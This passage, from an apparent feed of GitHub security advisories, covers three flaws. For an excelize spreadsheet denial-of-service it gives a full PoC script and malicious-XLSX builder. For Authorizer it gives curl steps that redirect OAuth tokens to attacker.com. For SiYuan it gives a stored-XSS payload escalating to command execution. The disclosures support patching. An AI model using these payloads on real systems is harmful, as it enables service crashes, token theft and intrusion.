-    z.writestr("_rels/.rels", '''&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;
-&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/&gt;
-&lt;/Relationships&gt;''')
-    z.writestr("xl/workbook.xml", '''&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
-          xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"&gt;
-&lt;sheets&gt;&lt;sheet name="Sheet1" sheetId="1" r:id="rId1"/&gt;&lt;/sheets&gt;
-&lt;/workbook&gt;''')
-    z.writestr("xl/_rels/workbook.xml.rels", '''&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;
-&lt;Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/&gt;
-&lt;/Relationships&gt;''')
-    z.writestr("xl/worksheets/sheet1.xml", f'''&lt;?xml version="1.0" encoding="UTF-8"?&gt;
-&lt;worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"&gt;
-&lt;sheetData&gt;&lt;row r="{row}"&gt;&lt;c r="A1"&gt;&lt;v&gt;1&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;/sheetData&gt;
-&lt;/worksheet&gt;''')
-</code></pre>
-<p><strong>Step 2: Trigger the vulnerability</strong></p>
-<pre><code class="language-go">package main
-
-import "github.com/xuri/excelize/v2"
-
-func main() {
-    f, err := excelize.OpenFile("malicious.xlsx")
-    if err != nil { panic(err) }
-    defer f.Close()
-    _, err = f.GetCellValue("Sheet1", "A1")  // triggers checkSheet() → unbounded make()
-    if err != nil { panic(err) }
-}
-</code></pre>
-<p><strong>Expected results:</strong></p>
-<ul>
-<li>Variant A (<code>r="2147483647"</code>): process is killed by the OOM killer (<code>fatal error: runtime: out of memory</code> or exit code 137).</li>
-<li>Variant B (<code>r="-1"</code>): process panics with <code>runtime error: index out of range [-2]</code> at <code>excelize.go:381</code> (exit code 2).</li>
-</ul>
-<p>Both variants were confirmed in a Docker container with <code>--memory 256m --memory-swap 256m</code>. The malicious XLSX payload is a few hundred bytes.</p>
-<h3 id="impact">Impact</h3>
-<p>This is a <strong>Denial-of-Service</strong> vulnerability. An unauthenticated remote attacker can crash or memory-exhaust any Go application that uses <code>github.com/xuri/excelize/v2</code> to open attacker-supplied XLSX files and subsequently calls any cell-reading API (<code>GetCellValue</code>, <code>GetRows</code>, <code>GetCols</code>, or any function that internally triggers <code>workSheetReader</code>).</p>
-<p><strong>Who is impacted:</strong></p>
-<ul>
-<li>Web services with XLSX upload or import endpoints (document processors, data pipelines, BI tools).</li>
-<li>CLI tools or batch jobs that parse user-supplied spreadsheet files.</li>
-<li>Any application using the library to handle untrusted XLSX documents.</li>
-</ul>
-<p>The attack requires no authentication and no user interaction beyond uploading a malicious file. The payload is a minimal well-formed ZIP of a few hundred bytes, making it trivial to construct and deliver. Repeated or concurrent exploitation can permanently deny service to all users of the affected application.</p>
-<h3 id="reproduction-artifacts">Reproduction artifacts</h3>
-<h4 id="dockerfile"><code>Dockerfile</code></h4>
-<pre><code class="language-dockerfile"># Dockerfile for VULN-001: Unbounded Row Index Allocation in excelize checkSheet()
-# CWE-770 — Allocation of Resources Without Limits or Throttling
-# Target: github.com/xuri/excelize/v2 @ commit f4a068b
-#
-# Exploit path:
-#   GetCellValue -&gt; getCellStringFunc -&gt; workSheetReader -&gt; checkSheet()
-#   In checkSheet() (excelize.go:341-393), the attacker-controlled &lt;row r="N"&gt;
-#   attribute is used directly as make([]xlsxRow, row) size with no bounds check.
-#
-# Variant A (r=2147483647): OOM — make([]xlsxRow, 2147483647) exhausts memory
-# Variant B (r=-1):         Panic — second loop does sheetData.Row[-2] (index OOB)
-
-FROM golang:latest AS builder
-
-# Copy the vulnerable excelize library source (serves as the Go module)
-COPY repo/ /excelize/
-
-# Copy the exploit main package written by poc.py
-COPY vuln-001/exploit_main.go /excelize/cmd/poc/main.go
-
-WORKDIR /excelize
-
-# Build the exploit binary.
-# -mod=mod: allow Go to update go.sum for any transitive deps.
-# CGO_ENABLED=0: produce a statically-linked binary for the runtime stage.
-RUN CGO_ENABLED=0 GOFLAGS="-mod=mod" go build -o /poc ./cmd/poc/
-
-# Minimal runtime stage (golang image provides a libc for cgo-free binary too)
-FROM golang:latest
-COPY --from=builder /poc /poc
-ENTRYPOINT ["/poc"]
-</code></pre>
-<h4 id="pocpy"><code>poc.py</code></h4>
-<pre><code class="language-python">#!/usr/bin/env python3
-"""
-PoC for VULN-001: Unbounded Row Index Allocation in excelize checkSheet()
-CWE-770 — Allocation of Resources Without Limits or Throttling
-Repository: qax-os/excelize  Commit: f4a068b
-
-Exploit mechanism:
-  xlsxWorksheet.checkSheet() (excelize.go:341-393) iterates worksheet rows and
-  uses the attacker-controlled &lt;row r="N"&gt; attribute directly as the length
-  argument to make([]xlsxRow, row) without any bounds validation against
-  TotalRows (1,048,576).
-
-  Variant A (r=2147483647): make([]xlsxRow, 2^31-1) → OOM / fatal error
-  Variant B (r=-1):         first loop leaves row=0; second loop executes
-                            sheetData.Row[-1-1] → runtime panic: index out of range
-
-This script:
-  1. Writes exploit_main.go (the Go PoC binary source).
-  2. Creates two malicious XLSX files (one per variant).
-  3. Builds the Docker image.
-  4. Runs each variant and captures evidence.
-  5. Writes phase2_result.json with verdict.
-"""
-
-import json
-import os
-import subprocess
-import sys
-import textwrap
-import zipfile
-
-# ---------------------------------------------------------------------------
-# Paths
-# ---------------------------------------------------------------------------
-BASE_DIR     = os.path.dirname(os.path.abspath(__file__))
-PARENT_DIR   = os.path.dirname(BASE_DIR)          # Docker build context
-RESULT_FILE  = os.path.join(BASE_DIR, "phase2_result.json")
-DOCKERFILE   = os.path.join(BASE_DIR, "Dockerfile")
-IMAGE_NAME   = "excelize-poc-vuln001"
-
-EXPLOIT_SRC  = os.path.join(BASE_DIR, "exploit_main.go")
-PANIC_XLSX   = os.path.join(BASE_DIR, "row_negative.xlsx")
-OOM_XLSX     = os.path.join(BASE_DIR, "row_maxint.xlsx")
-
-
-# ---------------------------------------------------------------------------
-# Step 1 — Write the Go exploit source
-# ---------------------------------------------------------------------------
-EXPLOIT_GO = textwrap.dedent("""\
-    // exploit_main.go — PoC for VULN-001
-    // Triggers excelize checkSheet() unbounded allocation via malicious XLSX.
-    package main
-
-    import (
-    \t"fmt"
-    \t"os"
-    \t"runtime/debug"
-
-    \texcelize "github.com/xuri/excelize/v2"
-    )
-
-    func main() {
-    \tif len(os.Args) &lt; 2 {
-    \t\tfmt.Fprintln(os.Stderr, "Usage: poc &lt;xlsx_file&gt;")
-    \t\tos.Exit(1)
-    \t}
-    \tpath := os.Args[1]
-    \tfmt.Printf("[*] Opening: %s\\n", path)
-
-    \t// Wrap the call so we can print a structured panic message before exiting.
-    \t// The panic itself is the evidence of exploitability.
-    \tfunc() {
-    \t\tdefer func() {
-    \t\t\tif r := recover(); r != nil {
-    \t\t\t\tfmt.Println("[VULN] PANIC CAUGHT — vulnerability confirmed")
-    \t\t\t\tfmt.Printf("[VULN] panic value: %v\\n", r)
-    \t\t\t\tfmt.Println("[VULN] Stack trace:")
-    \t\t\t\tdebug.PrintStack()
-    \t\t\t\tos.Exit(2) // exit 2 = exploitable crash (panic)
-    \t\t\t}
-    \t\t}()
-
-    \t\tf, err := excelize.OpenFile(path)
-    \t\tif err != nil {
-    \t\t\tfmt.Printf("[!] OpenFile error: %v\\n", err)
-    \t\t\tos.Exit(1)
-    \t\t}
-    \t\tdefer f.Close()
-
-    \t\t// GetCellValue → getCellStringFunc → workSheetReader → checkSheet()
-    \t\t// checkSheet() is the sink: make([]xlsxRow, row) where row is attacker-controlled.
-    \t\tfmt.Println("[*] Calling GetCellValue — entering checkSheet() sink")
-    \t\tval, err := f.GetCellValue("Sheet1", "A1")
-    \t\tif err != nil {
-    \t\t\t// Some errors surface instead of panicking (e.g. allocation failures
-    \t\t\t// that Go converts to errors in some configurations).
-    \t\t\tfmt.Printf("[!] GetCellValue error: %v\\n", err)
-    \t\t\tos.Exit(3) // exit 3 = error path (still abnormal)
-    \t\t}
-    \t\tfmt.Printf("[*] GetCellValue returned normally, value=%q (no crash)\\n", val)
-    \t}()
-    }
-""")
-
-
-def write_exploit_source() -&gt; None:
-    with open(EXPLOIT_SRC, "w") as fh:
-        fh.write(EXPLOIT_GO)
-    print(f"[+] Wrote exploit source: {EXPLOIT_SRC}")
-
-
-# ---------------------------------------------------------------------------
-# Step 2 — Build malicious XLSX files
-# ---------------------------------------------------------------------------
-CONTENT_TYPES = (
-    '&lt;?xml version="1.0" encoding="UTF-8"?&gt;'
-    '&lt;Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"&gt;'
-    '&lt;Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/&gt;'
-    '&lt;Default Extension="xml"  ContentType="application/xml"/&gt;'
-    '&lt;Override PartName="/xl/workbook.xml"'
-    ' ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/&gt;'
-    '&lt;Override PartName="/xl/worksheets/sheet1.xml"'
-    ' ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/&gt;'
-    '&lt;/Types&gt;'
-)
-
-RELS = (
-    '&lt;?xml version="1.0" encoding="UTF-8"?&gt;'
-    '&lt;Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;'
-    '&lt;Relationship Id="rId1"'
-    ' Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"'
-    ' Target="xl/workbook.xml"/&gt;'
-    '&lt;/Relationships&gt;'
-)
-
-WORKBOOK = (
-    '&lt;?xml version="1.0" encoding="UTF-8"?&gt;'
-    '&lt;workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"'
-    ' xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"&gt;'
-    '&lt;sheets&gt;&lt;sheet name="Sheet1" sheetId="1" r:id="rId1"/&gt;&lt;/sheets&gt;'
-    '&lt;/workbook&gt;'
-)
-
-WORKBOOK_RELS = (
-    '&lt;?xml version="1.0" encoding="UTF-8"?&gt;'
-    '&lt;Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"&gt;'
-    '&lt;Relationship Id="rId1"'
-    ' Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet"'
-    ' Target="worksheets/sheet1.xml"/&gt;'
-    '&lt;/Relationships&gt;'
-)
-
-
-def sheet_xml(row_r: str) -&gt; str:
-    return (
-        '&lt;?xml version="1.0" encoding="UTF-8"?&gt;'
-        '&lt;worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"&gt;'
-        f'&lt;sheetData&gt;&lt;row r="{row_r}"&gt;&lt;c r="A1"&gt;&lt;v&gt;1&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;/sheetData&gt;'
-        '&lt;/worksheet&gt;'
-    )
-
-
-def build_xlsx(path: str, row_r: str) -&gt; None:
-    with zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED) as z:
-        z.writestr("[Content_Types].xml",        CONTENT_TYPES)
-        z.writestr("_rels/.rels",               RELS)
-        z.writestr("xl/workbook.xml",           WORKBOOK)
-        z.writestr("xl/_rels/workbook.xml.rels", WORKBOOK_RELS)
-        z.writestr("xl/worksheets/sheet1.xml",  sheet_xml(row_r))
-    print(f"[+] Created {os.path.basename(path)}  (row r={row_r!r})")
-
-
-# ---------------------------------------------------------------------------
-# Step 3 — Docker helpers
-# ---------------------------------------------------------------------------
-def run_cmd(cmd: list, timeout: int = 600) -&gt; subprocess.CompletedProcess:
-    print(f"[&gt;] {' '.join(str(x) for x in cmd)}")
-    return subprocess.run(
-        cmd,
-        capture_output=True,
-        text=True,
-        timeout=timeout,
-    )
-
-
-def docker_build() -&gt; tuple[bool, str]:
-    result = run_cmd(
-        [
-            "docker", "build",
-            "--no-cache",
-            "-f", DOCKERFILE,
-            "-t", IMAGE_NAME,
-            PARENT_DIR,
-        ],
-        timeout=600,
-    )
-    combined = result.stdout + result.stderr
-    if result.returncode != 0:
-        print(f"[-] docker build FAILED (rc={result.returncode})")
-        print(combined[-4000:])
-        return False, combined
-    print("[+] Docker image built successfully")
-    return True, combined
-
-
-def docker_run_variant(label: str, xlsx_path: str, mem: str = "256m", timeout: int = 90) -&gt; dict:
-    """Run the exploit container against one XLSX file and return analysis dict."""
-    cmd = [
-        "docker", "run", "--rm",
-        "--memory", mem,
-        "--memory-swap", mem,
-        "-v", f"{xlsx_path}:/input.xlsx:ro",
-        IMAGE_NAME,
-        "/input.xlsx",
-    ]
-    run_cmd_str = " ".join(cmd)
-    try:
-        result = run_cmd(cmd, timeout=timeout)
-        rc = result.returncode
-        stdout = result.stdout or ""
-        stderr = result.stderr or ""
-    except subprocess.TimeoutExpired:
-        rc = -99
-        stdout = ""
-        stderr = f"TIMEOUT after {timeout}s"
-
-    combined = stdout + stderr
-    print(f"\n--- {label} ---")
-    print(f"  exit code : {rc}")
-    print(f"  stdout    : {stdout[:1200]}")
-    print(f"  stderr    : {stderr[:1200]}")
-
-    is_panic = any(kw in combined for kw in (
-        "index out of range",
-        "PANIC CAUGHT",
-        "runtime error",
-        "goroutine ",
-        "panic:",
-    ))
-    is_oom = any(kw in combined for kw in (
-        "out of memory",
-        "cannot allocate",
-        "fatal error",
-        "makeslice",
-    )) or rc == 137
-
-    # exit 2 = panic caught; exit 137 = OOM kill; exit 3 = error path
-    crashed = rc != 0 and (is_panic or is_oom or rc in (2, 3, 137))
-
-    return {
-        "label":    label,
-        "rc":       rc,
-        "is_panic": is_panic,
-        "is_oom":   is_oom,
-        "crashed":  crashed,
-        "run_cmd":  run_cmd_str,
-        "snippet":  combined[:1500].strip(),
-    }
-
-
-# ---------------------------------------------------------------------------
-# Main
-# ---------------------------------------------------------------------------
-def main() -&gt; None:
-    print("=" * 65)
-    print("VULN-001 PoC — excelize checkSheet() unbounded allocation DoS")
-    print("=" * 65)
-
-    # 1. Write Go exploit source (needed before docker build)
-    write_exploit_source()
-
-    # 2. Create malicious XLSX payloads
-    build_xlsx(PANIC_XLSX, "-1")          # Variant B: index OOB panic
-    build_xlsx(OOM_XLSX,   "2147483647")  # Variant A: 2 GB+ make() → OOM
-
-    # 3. Build Docker image
-    build_cmd = (
-        f"docker build --no-cache -f {DOCKERFILE} -t {IMAGE_NAME} {PARENT_DIR}"
-    )
-    build_ok, build_out = docker_build()
-    if not build_ok:
-        payload = {
-            "passed":        False,
-            "verdict":       "FAIL",
-            "reason":        (
-                "Docker 이미지 빌드에 실패했습니다. golang:latest 이미지가 go.mod의 "
-                "'go 1.25.0' 요건을 충족하지 않을 수 있습니다. Dockerfile에서 "
-                "'golang:1.25' 등 명시적 버전 태그로 교체 후 재시도 바랍니다."
-            ),
-            "build_command": build_cmd,
-            "run_command":   "",
-            "poc_command":   f"python3 {os.path.abspath(__file__)}",
-            "evidence":      build_out[-2000:],
-            "artifacts":     ["Dockerfile", "poc.py"],
-        }
-        with open(RESULT_FILE, "w") as fh:
-            json.dump(payload, fh, indent=2, ensure_ascii=False)
-        print(f"\n[!] FAIL result → {RESULT_FILE}")
-        sys.exit(1)
-
-    # 4. Run both variants
-    ev_panic = docker_run_variant(
-        "Variant B — r=-1 (index out of range panic)", PANIC_XLSX, mem="256m")
-    ev_oom   = docker_run_variant(
-        "Variant A — r=2147483647 (OOM)",              OOM_XLSX,   mem="256m")
-
-    # 5. Verdict
-    passed = ev_panic["crashed"] or ev_oom["crashed"]
-
-    if ev_panic["crashed"]:
-        primary, primary_ev = "B (r=-1, panic)", ev_panic
-    elif ev_oom["crashed"]:
-        primary, primary_ev = "A (r=2147483647, OOM)", ev_oom
-    else:
-        primary, primary_ev = "B (r=-1, panic)", ev_panic  # best-effort
-
-    if passed:
-        reason = (
-            f"실행 결과 비정상 종료 확인됨 (주요 variant: {primary}). "
-            f"Variant B(r=-1): rc={ev_panic['rc']}, panic={ev_panic['is_panic']}; "
-            f"Variant A(r=2147483647): rc={ev_oom['rc']}, oom={ev_oom['is_oom']}. "
-            "excelize.go:377 make([]xlsxRow, row)에 대한 bounds 검증 부재가 "
-            "컨테이너 내 실제 DoS(패닉/OOM)를 유발함을 실행으로 증명."
-        )
-        verdict = "PASS"
-    else:
-        reason = (
-            "컨테이너 실행이 완료되었으나 충돌(패닉/OOM) 증거가 관측되지 않음. "
-            f"Variant B rc={ev_panic['rc']}, Variant A rc={ev_oom['rc']}. "
-            "가능한 원인: (1) Go 런타임이 make() 실패를 panic 대신 error로 반환, "
-            "(2) 메모리 한도 초과 전 OOM killer가 작동하지 않음. "
-            "다음을 시도: --memory 64m으로 재실행, 또는 호스트에서 직접 Go 빌드 후 실행."
-        )
-        verdict = "FAIL"
-
-    phase2 = {
-        "passed":        passed,
-        "verdict":       verdict,
-        "reason":        reason,
-        "build_command": build_cmd,
-        "run_command":   primary_ev["run_cmd"],
-        "poc_command":   f"python3 {os.path.abspath(__file__)}",
-        "evidence":      primary_ev["snippet"],
-        "artifacts":     ["Dockerfile", "poc.py"],
-    }
-
-    with open(RESULT_FILE, "w") as fh:
-        json.dump(phase2, fh, indent=2, ensure_ascii=False)
-
-    print(f"\n{'='*65}")
-    print(f"Verdict : {verdict}  (passed={passed})")
-    print(f"Result  → {RESULT_FILE}")
-    print("=" * 65)
-
-
-if __name__ == "__main__":
-    main()
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/qax-os/excelize/security/advisories/GHSA-h69g-9hx6-f3v4">https://github.com/qax-os/excelize/security/advisories/GHSA-h69g-9hx6-f3v4</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-54063">https://nvd.nist.gov/vuln/detail/CVE-2026-54063</a></li>
-<li><a href="https://github.com/qax-os/excelize/releases/tag/v2.11.0">https://github.com/qax-os/excelize/releases/tag/v2.11.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-h69g-9hx6-f3v4">https://github.com/advisories/GHSA-h69g-9hx6-f3v4</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h69g-9hx6-f3v4</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-07-10T19:25:20.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/authorizerdev/authorizer] Authorizer: Unvalidated redirect_uri in /authorize leaks OAuth2 tokens to attacker-controlled URL]]></title>
-        <id>https://github.com/advisories/GHSA-h29v-hj44-q8cv</id>
-        <link href="https://github.com/advisories/GHSA-h29v-hj44-q8cv"/>
-        <updated>2026-07-10T19:25:16.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The <code>/authorize</code> endpoint accepts any <code>redirect_uri</code> without validating it against <code>AllowedOrigins</code>. When <code>response_type=token</code> or <code>response_type=id_token</code>, the server appends <code>access_token</code>, <code>id_token</code>, and <code>refresh_token</code> as query parameters and issues a 302 redirect to the attacker-supplied URL. An unauthenticated attacker can obtain the required <code>client_id</code> from the public <code>/graphql?query={meta{client_id}}</code> endpoint.</p>
-<p>Partial fix was applied in v2.0.1 to other handlers (<code>oauth_login</code>, <code>verify_email</code>, <code>magic_link_login</code>, <code>forgot_password</code>, <code>invite_members</code>, <code>oauth_callback</code>) but <code>/authorize</code> was not included.</p>
-<h2 id="vulnerable-code">Vulnerable Code</h2>
-<p><code>internal/http_handlers/authorize.go</code>:</p>
-<pre><code class="language-go">redirectURI := strings.TrimSpace(gc.Query("redirect_uri"))
-// ... no IsValidOrigin() call ...
-// response_type=token path (line ~263):
-if strings.Contains(redirectURI, "?") {
-    redirectURI = redirectURI + "&amp;" + params
-} else {
-    redirectURI = redirectURI + "?" + params
-}
-handleResponse(gc, responseMode, authURL, redirectURI, ...) // 302 to attacker URL
-</code></pre>
-<p>Compare with the fixed <code>oauth_login.go</code> in v2.0.1 which calls <code>validators.IsValidOrigin(redirectURI, h.Config.AllowedOrigins)</code>.</p>
-<h2 id="steps-to-reproduce">Steps to Reproduce</h2>
-<pre><code class="language-bash"># 1. Obtain client_id (no authentication required)
-CLIENT_ID=$(curl -s http://TARGET/graphql \
-  -H "Content-Type: application/json" \
-  -d '{"query":"{meta{client_id}}"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['meta']['client_id'])")
-
-echo "client_id: $CLIENT_ID"
-
-# 2. Craft the malicious URL and send to victim (victim must be logged in)
-# When victim opens this URL, tokens are delivered to attacker.com
-MALICIOUS_URL="http://TARGET/authorize?response_type=token&amp;client_id=${CLIENT_ID}&amp;redirect_uri=https://attacker.com/steal&amp;scope=openid+profile+email&amp;state=x&amp;response_mode=query"
-
-echo "Send to victim: $MALICIOUS_URL"
-
-# 3. Attacker receives 302 redirect with all tokens:
-# https://attacker.com/steal?access_token=eyJ...&amp;token_type=bearer&amp;expires_in=...&amp;id_token=eyJ...
-
-# 4. Validate stolen token
-curl -s http://TARGET/userinfo \
-  -H "Authorization: Bearer STOLEN_ACCESS_TOKEN"
-# Returns: {"email":"victim@example.com","id":"...","roles":["user"]}
-</code></pre>
-<h2 id="impact">Impact</h2>
-<p>An attacker who tricks a logged-in user into clicking a crafted link can steal the victim's <code>access_token</code>, <code>id_token</code>, and <code>refresh_token</code>. The attacker can then impersonate the victim for the full token lifetime. No user interaction beyond clicking the link is required; the victim's browser issues the redirect automatically.</p>
-<h2 id="proposed-fix">Proposed Fix</h2>
-<p>Add the same <code>IsValidOrigin</code> check that was applied to the other handlers in v2.0.1:</p>
-<pre><code class="language-go">// In authorize.go, after reading redirect_uri:
-if !validators.IsValidOrigin(redirectURI, h.Config.AllowedOrigins) {
-    handleResponse(gc, responseMode, authURL, redirectURI, map[string]interface{}{
-        "error":             "invalid_request",
-        "error_description": "redirect_uri is not allowed",
-    }, http.StatusBadRequest)
-    return
-}
-</code></pre>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/authorizerdev/authorizer/security/advisories/GHSA-h29v-hj44-q8cv">https://github.com/authorizerdev/authorizer/security/advisories/GHSA-h29v-hj44-q8cv</a></li>
-<li><a href="https://github.com/advisories/GHSA-h29v-hj44-q8cv">https://github.com/advisories/GHSA-h29v-hj44-q8cv</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-h29v-hj44-q8cv</uri>
-        </author>
-        <category label="severity" term="CRITICAL"/>
-        <published>2026-07-10T19:25:15.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/siyuan-note/siyuan/kernel] SiYuan: Stored XSS to RCE via CSS-snippet <style> breakout in renderSnippet()]]></title>
-        <id>https://github.com/advisories/GHSA-mvjr-vv3c-w4qv</id>
-        <link href="https://github.com/advisories/GHSA-mvjr-vv3c-w4qv"/>
-        <updated>2026-07-10T19:25:10.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p>A CSS snippet body containing <code>&lt;/style&gt;</code> breaks out of its surrounding <code>&lt;style&gt;</code> tag when <code>renderSnippet()</code> interpolates it via <code>insertAdjacentHTML</code>. A payload like <code>&lt;/style&gt;&lt;img src=x onerror="..."&gt;</code> runs arbitrary JavaScript in the renderer. On Electron desktop builds the renderer runs with <code>nodeIntegration:true</code>, so <code>require('child_process')</code> is reachable from the injected handler and the XSS chains to host RCE. Snippets sync via the workspace repository, so an attacker with write access to any synced workspace plants the payload once and it fires on every device that pulls.</p>
-<p>The bug also bypasses the user's <code>enabledCSS</code> / <code>enabledJS</code> separation. A user who turned <code>enabledJS</code> off was making a deliberate call not to run untrusted JavaScript; the CSS path runs it anyway.</p>
-<h3 id="details">Details</h3>
-<p>Affected:</p>
-<ul>
-<li>HEAD <code>96dfe0b</code> (v3.6.5, 2026-04-21)</li>
-<li>Sink: <code>app/src/config/util/snippets.ts:32</code></li>
-<li>Source: <code>/api/snippet/getSnippet</code>, backed by <code>data/snippets/conf.json</code></li>
-<li>Default config: <code>EnabledCSS: true</code>, <code>EnabledJS: true</code> at <code>kernel/conf/snippet.go:26-27</code></li>
-<li>Electron config: <code>nodeIntegration:true</code>, <code>contextIsolation:false</code>, <code>webSecurity:false</code> on every <code>BrowserWindow</code> in <code>app/electron/main.js:307,408-411,1107-1110,1150-1153,1322</code></li>
-</ul>
-<p>The write path stores raw content. <code>kernel/api/snippet.go:107-130</code> copies <code>Content</code> from the request straight into the snippet record with no HTML escape, no <code>&lt;/style&gt;</code> check, no type-specific validation:</p>
-<pre><code class="language-go">snippet := &amp;conf.Snippet{
-    ID:      m["id"].(string),
-    Name:    m["name"].(string),
-    Type:    m["type"].(string),
-    Content: m["content"].(string),
-    Enabled: m["enabled"].(bool),
-}
-</code></pre>
-<p>Storage is workspace-internal and syncs. <code>kernel/model/repository.go:1748,1798</code> reference <code>data/snippets/conf.json</code>, so the malicious record propagates to every sync peer.</p>
-<p>The renderer reads the snippet back through <code>/api/snippet/getSnippet</code> and interpolates it into a <code>&lt;style&gt;</code> tag, raw. <code>app/src/config/util/snippets.ts:32</code>, called on app boot and on the <code>reloadSnippet</code> WebSocket event:</p>
-<pre><code class="language-ts">fetchPost("/api/snippet/getSnippet", {type: "all", enabled: 2}, (response) =&gt; {
-  response.data.snippets.forEach((item: ISnippet) =&gt; {
-    const id = `snippet${item.type === "css" ? "CSS" : "JS"}${item.id}`;
-    if (item.type === "css") {
-      document.head.insertAdjacentHTML("beforeend", `&lt;style id="${id}"&gt;${item.content}&lt;/style&gt;`);
-    } else if (item.type === "js") {
-      // intentional script-loading path
-    }
-  });
-});
-</code></pre>
-<p><code>${item.content}</code> lands inside the <code>&lt;style&gt;</code> tag. The HTML parser closes the style on the first <code>&lt;/style&gt;</code> substring and treats anything after as a sibling of the empty <code>&lt;style&gt;</code> element.</p>
-<p>Worth noting: the JS branch right after the CSS one already does the safe thing. It uses <code>document.createElement("script")</code> and sets <code>el.text = item.content</code>. That's a text-node assignment, no HTML parsing. The CSS branch just doesn't use the equivalent on a <code>&lt;style&gt;</code> element, and that's the bug.</p>
-<h4 id="suggested-fix">Suggested fix</h4>
-<p>The cleanest fix mirrors what the JS branch already does. Build the element with <code>createElement</code> and set <code>textContent</code>:</p>
-<pre><code class="language-ts">if (item.type === "css") {
-  const el = document.createElement("style");
-  el.id = id;
-  el.textContent = item.content;
-  document.head.appendChild(el);
-}
-</code></pre>
-<p><code>textContent</code> on a <code>&lt;style&gt;</code> element populates the CSS rules without invoking the HTML parser, so <code>&lt;/style&gt;</code> in the body is a 4-character text node instead of a close tag.</p>
-<p>If touching that line is undesirable, the smaller patch is to escape <code>&lt;</code> before interpolation:</p>
-<pre><code class="language-ts">const safe = item.content.replace(/[&amp;&lt;]/g, c =&gt; c === "&amp;" ? "&amp;amp;" : "&amp;lt;");
-document.head.insertAdjacentHTML("beforeend", `&lt;style id="${id}"&gt;${safe}&lt;/style&gt;`);
-</code></pre>
-<p>Either fix on its own closes the bug. Worth also rejecting <code>&lt;/style&gt;</code> on the <code>setSnippet</code> backend handler so older renderers pulling the same synced workspace stay safe.</p>
-<h3 id="poc">PoC</h3>
-<p>Stand up SiYuan:</p>
-<pre><code class="language-bash">docker run -d --name siyuan-poc \
-  -v ./workspace:/siyuan/workspace \
-  -p 16806:6806 \
-  b3log/siyuan:latest \
-  --workspace=/siyuan/workspace --accessAuthCode=hunter2
-</code></pre>
-<p>Plant the snippet:</p>
-<pre><code class="language-bash">TOKEN=$(jq -r '.api.token' workspace/conf/conf.json)
-
-curl -X POST http://localhost:16806/api/snippet/setSnippet \
-  -H "Content-Type: application/json" \
-  -H "Authorization: Token $TOKEN" \
-  -d '{"snippets":[{"id":"","name":"poc","type":"css","enabled":true,"content":"&lt;/style&gt;&lt;img src=x onerror=\"document.title=\\\"SIYUAN_XSS\\\";window.__siyuan_xss=true\"&gt;"}]}'
-</code></pre>
-<p>Returns <code>{"code":0,"msg":"","data":null}</code>. The snippet now sits at <code>workspace/data/snippets/conf.json</code> verbatim.</p>
-<p>Open <code>http://localhost:16806/stage/build/desktop/?r=1</code> or the Electron app pointing at the same workspace, authenticate, and run in DevTools:</p>
-<pre><code class="language-js">({
-  markerFired: window.__siyuan_xss === true,
-  styleCount: document.querySelectorAll('style[id^="snippetCSS"]').length,
-  imgsInHead: document.head.querySelectorAll('img').length,
-  snippetStyleEmpty: document.querySelector('style[id^="snippetCSS"]')?.textContent.length === 0
-})
-</code></pre>
-<p>Result from my run on 2026-05-19 against <code>b3log/siyuan:latest</code>:</p>
-<pre><code class="language-json">{
-  "markerFired": true,
-  "styleCount": 1,
-  "imgsInHead": 1,
-  "snippetStyleEmpty": true
-}
-</code></pre>
-<p><code>document.title</code> is <code>SIYUAN_XSS</code>. The <code>&lt;style&gt;</code> exists but closed empty on the first <code>&lt;/style&gt;</code>. The smuggled <code>&lt;img&gt;</code> is a sibling in <code>&lt;head&gt;</code>. The injected <code>onerror</code> ran arbitrary JS.</p>
-<p>To turn it into RCE on Electron, swap the marker payload for:</p>
-<pre><code class="language-html">&lt;img src=x onerror="require('child_process').execSync('open /Applications/Calculator.app')"&gt;
-</code></pre>
-<p><code>require</code> is reachable from the renderer because of <code>nodeIntegration:true</code> in <code>app/electron/main.js:408</code>.</p>
-<h3 id="impact">Impact</h3>
